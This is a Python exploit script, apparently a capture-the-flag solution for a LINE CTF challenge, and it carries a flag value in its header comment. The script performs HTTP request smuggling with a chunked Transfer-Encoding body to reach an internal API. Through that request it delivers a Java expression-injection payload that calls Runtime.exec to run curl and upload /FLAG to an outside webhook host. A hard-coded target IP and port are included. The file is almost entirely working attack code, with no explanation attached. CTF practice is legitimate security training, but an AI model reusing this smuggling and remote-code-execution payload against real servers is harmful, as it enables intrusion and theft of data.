# LINECTF{7988de328384f8a19998923a87aa053f}

import requests
import socket
import sys
import json

PAYLOAD = {
    "name": '${"ab".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("curl https://webhook.site/4f858ea1-7b1d-4e60-be16-5394a6aa673a -T /FLAG")}'
}

http_request = """POST /api/external/ HTTP/1.0
Host: {}
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

{}
""".replace(
    "\n", "\r\n"
)

smuggling_payload = """POST /api/internal/ HTTP/1.0
Host: heritage-app:8080
Content-Type: application/json
Content-Length: {}

{}
""".replace(
    "\n", "\r\n"
)


def exploit(host, port, i):
    try:
        server_address = (host, port)
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(server_address)
        smuggle = smuggling_payload.format(
            len(json.dumps(PAYLOAD)), json.dumps(PAYLOAD)
        )
        chunked = "{}\r\n{}\r\n0\r\n".format(hex(len(smuggle))[2:], smuggle)
        request = http_request.format(host + ":" + str(port), chunked)
        print(request.replace("\r\n", "\n"))
        client_socket.send(request.encode())
        while True:
            response = client_socket.recv(2048).decode()
            if response:
                pass
                # print(response)
            else:
                break
        client_socket.close()

    except Exception as e:
        print(str(e))
        return


for i in range(1):
    exploit("35.200.117.55", 20080, i)
